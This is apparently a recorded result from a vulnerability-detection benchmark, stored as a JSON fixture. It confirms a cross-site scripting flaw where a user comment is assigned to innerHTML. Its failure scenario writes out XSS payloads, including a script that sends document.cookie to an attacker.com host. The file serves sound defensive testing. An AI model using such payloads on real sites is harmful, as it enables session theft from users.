@@ -1,0 +1,8 @@
+{
+  "key": "aff0795dd0b8b1bb28f1e7012e52ecea",
+  "file": "positive/xss/inner-html-user-comment.ts",
+  "model": "default",
+  "raw": "```json\n[\n  {\n    \"vulnSlug\": \"xss\",\n    \"lineNumbers\": [9],\n    \"verdict\": \"confirmed\",\n    \"severity\": \"high\",\n    \"summary\": \"User-provided comment is assigned directly to innerHTML without sanitization, enabling arbitrary HTML/JavaScript execution.\",\n    \"rationale\": \"Line 9 assigns the `userComment` parameter directly to `container.innerHTML` with no sanitization, encoding, or validation. The parameter name and function context indicate this accepts user-authored content. Assigning unsanitized user input to innerHTML allows an attacker to inject malicious HTML elements and JavaScript code that will execute in viewers' browsers.\",\n    \"failureScenario\": \"A malicious user submits a comment containing `<img src=x onerror=alert(document.cookie)>` or `<script>fetch('https://attacker.com/steal?data='+document.cookie)</script>`. When another user views this comment and `renderComment` is called with the malicious string, the injected JavaScript executes in the victim's browser, allowing the attacker to steal session cookies, credentials, or perform actions on behalf of the victim.\",\n    \"confidence\": 0.99\n  }\n]\n```",
+  "recordedAt": "2026-08-12T04:16:32.946Z",
+  "elapsedMs": 19861.581153018178
+}
